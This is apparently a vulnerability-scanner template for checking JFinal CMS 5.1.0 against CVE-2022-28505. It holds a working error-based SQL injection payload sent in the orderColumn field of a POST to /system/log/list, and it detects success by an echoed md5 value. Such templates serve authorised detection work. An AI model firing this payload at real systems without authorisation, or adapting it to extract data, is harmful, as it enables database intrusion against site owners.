name: poc-yaml-jfinalcms-510-cve-2022-28505-sqli
binding: 1fc37081-1d05-44ed-be69-40006312faf5
manual: true
detail:
    author: ct
    links:
        - https://github.com/jflyfox/jfinal_cms/issues/33
    vulnerability:
        id: CT-418592
        level: high
    check_action: 需要认证登陆
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /system/log/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=) and (select 1 and extractvalue(1,concat(0x7e,md5({{s1}}))))-- woqr&form.orderAsc=&attr.log_type=-1&totalRecords=2&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r1()
